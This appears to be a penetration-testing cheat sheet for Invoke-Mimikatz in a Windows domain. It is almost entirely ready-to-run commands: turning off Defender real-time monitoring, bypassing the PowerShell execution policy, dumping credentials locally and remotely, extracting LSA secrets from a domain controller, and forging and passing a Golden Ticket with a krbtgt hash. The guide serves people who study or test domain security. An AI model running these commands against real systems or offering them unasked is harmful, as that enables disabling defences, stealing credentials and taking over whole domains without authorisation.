# **Prerequisites:**

## 1. Disable Virus and Threats Real-time Protection 
```
Set-MpPreference -DisableRealtimeMonitoring $true
```
## 2. Bypass the powershell execution policy 
```
powershel -ep bypass
```
## 3. Load the Mimikatz Script 
```
. .\Invoke-Mimikatz.ps1
```

# **Commands:**

Dump credentials on a local machine.

`Invoke-Mimikatz -DumpCreds`

Dump credentials on multiple remote machines.

`Invoke-Mimikatz -DumpCreds -ComputerName pc01.universe.com`

Dump the LSA Secrets from the Domain Controller remotely

`invoke-mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dc.domain.com`

Create a **Golden Ticket** with this command and pass the ticket in current powershell session

`invoke-mimikatz -Command '"kerberos::golden /user:Administrator /sid:S-1-5-21-3323191838-1711971207-1097898698 /domain:universe.com /krbtgt:8de27e7bd8c073e4a12520b75d72a51c /ptt"'`

---

`kerberos::golden` mimikatz module '_kerberos_' with a function called '_golden_'

`/user:Administrator` mentions the user which we want to impersonate

`/domain:domain.com` specify the domain name

`/sid:S-1-5-21-1874506631-3219952063-538504511` specify the domain SID (Security Identifier) [get with _Get-NetDomain_ available in poweview.ps1 ]

`/krbtgt:ff46a9d8bd66c6efd77603da26796f35` Specify the NTLM hash is krbtgt account that we harvested before

`/ptt` this tell the mimikatz to _pass the ticket_ on the current session

